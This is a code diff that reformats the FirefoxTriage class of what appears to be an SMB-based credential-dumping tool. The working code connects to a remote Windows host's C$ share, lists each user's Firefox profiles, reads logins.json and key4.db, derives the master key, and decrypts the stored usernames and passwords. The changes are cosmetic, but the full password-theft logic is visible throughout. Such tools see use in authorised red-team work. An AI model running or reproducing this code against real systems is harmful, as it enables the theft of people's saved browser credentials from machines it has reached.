@@ -31,7 +31,7 @@ class FirefoxTriage:
 
     firefox_generic_path = "Users\\{}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
     share = "C$"
-    false_positive = [
+    false_positive = (
         ".",
         "..",
         "desktop.ini",
@@ -39,7 +39,7 @@ class FirefoxTriage:
         "Default",
         "Default User",
         "All Users",
-    ]
+    )
 
     def __init__(self, target, logger, conn: DPLootSMBConnection = None):
         self.target = target
@@ -63,7 +63,8 @@ class FirefoxTriage:
         for user in users:
             try:
                 directories = self.conn.remote_list_dir(
-                    share=self.share, path=self.firefox_generic_path.format(user)
+                    share=self.share,
+                    path=self.firefox_generic_path.format(user)
                 )
             except Exception as e:
                 if "STATUS_OBJECT_PATH_NOT_FOUND" in str(e):
@@ -71,11 +72,7 @@ class FirefoxTriage:
                 self.logger.debug(e)
             if directories is None:
                 continue
-            for d in [
-                d
-                for d in directories
-                if d.get_longname() not in self.false_positive and d.is_directory() > 0
-            ]:
+            for d in [d for d in directories if d.get_longname() not in self.false_positive and d.is_directory() > 0]:
                 try:
                     logins_path = (
                         self.firefox_generic_path.format(user)
@@ -96,7 +93,9 @@ class FirefoxTriage:
                         + "\\key4.db"
                     )
                     key4_data = self.conn.readFile(
-                        self.share, key4_path, bypass_shared_violation=True
+                        self.share,
+                        key4_path,
+                        bypass_shared_violation=True
                     )
                     if key4_data is None:
                         continue
@@ -110,10 +109,14 @@ class FirefoxTriage:
                         continue
                     for username, pwd, host in logins:
                         decoded_username = self.decrypt(
-                            key=key, iv=username[1], ciphertext=username[2]
+                            key=key,
+                            iv=username[1],
+                            ciphertext=username[2]
                         ).decode("utf-8")
                         password = self.decrypt(
-                            key=key, iv=pwd[1], ciphertext=pwd[2]
+                            key=key,
+                            iv=pwd[1],
+                            ciphertext=pwd[2]
                         ).decode("utf-8")
                         if password is not None and decoded_username is not None:
                             firefox_data.append(
@@ -127,23 +130,18 @@ class FirefoxTriage:
                 except Exception as e:
                     if "STATUS_OBJECT_PATH_NOT_FOUND" in str(e):
                         continue
-                    print(e)
-                    self.logger.debug(e)
+                    self.logger.exception(e)
         return firefox_data
 
     def get_login_data(self, logins_data):
-        logins = []
         json_logins = json.loads(logins_data)
         if "logins" not in json_logins:
-            return logins  # No logins key in logins.json file
-        for row in json_logins["logins"]:
-            logins.append(
-                (
-                    self.decode_login_data(row["encryptedUsername"]),
-                    self.decode_login_data(row["encryptedPassword"]),
-                    row["hostname"],
-                )
-            )
+            return []  # No logins key in logins.json file
+        logins = [(
+            self.decode_login_data(row["encryptedUsername"]),
+            self.decode_login_data(row["encryptedPassword"]),
+            row["hostname"]
+        ) for row in json_logins["logins"]]
         return logins
 
     def get_key(self, key4_data, master_password=b""):
@@ -157,7 +155,8 @@ class FirefoxTriage:
 
         if row:
             global_salt, master_password, _ = self.is_master_password_correct(
-                key_data=row, master_password=master_password
+                key_data=row,
+                master_password=master_password
             )
             if global_salt:
                 try:
@@ -170,7 +169,9 @@ class FirefoxTriage:
                     if a102 == CKA_ID:
                         decoded_a11 = decoder.decode(a11)
                         key = self.decrypt_3des(
-                            decoded_a11, master_password, global_salt
+                            decoded_a11,
+                            master_password,
+                            global_salt
                         )
                         if key is not None:
                             fh.close()
@@ -188,7 +189,9 @@ class FirefoxTriage:
             item2 = key_data[1]
             decoded_item2 = decoder.decode(item2)
             cleartext_data = self.decrypt_3des(
-                decoded_item2, master_password, global_salt
+                decoded_item2,
+                master_password,
+                global_salt
             )
             if cleartext_data != "password-check\x02\x02".encode():
                 return "", "", ""
@@ -202,12 +205,13 @@ class FirefoxTriage:
 
         users_dir_path = "Users\\*"
         directories = self.conn.listPath(
-            shareName=self.share, path=ntpath.normpath(users_dir_path)
+            shareName=self.share,
+            path=ntpath.normpath(users_dir_path)
         )
+
         for d in directories:
             if d.get_longname() not in self.false_positive and d.is_directory() > 0:
                 users.append(d.get_longname())
-
         return users
 
     @staticmethod
@@ -267,7 +271,11 @@ class FirefoxTriage:
 
             k = sha1(global_salt + master_password).digest()
             key = pbkdf2_hmac(
-                "sha256", k, entry_salt, iteration_count, dklen=key_length
+                "sha256",
+                k,
+                entry_salt,
+                iteration_count,
+                dklen=key_length
             )
 
             # https://hg.mozilla.org/projects/nss/rev/fc636973ad06392d11597620b602779b4af312f6#l6.49
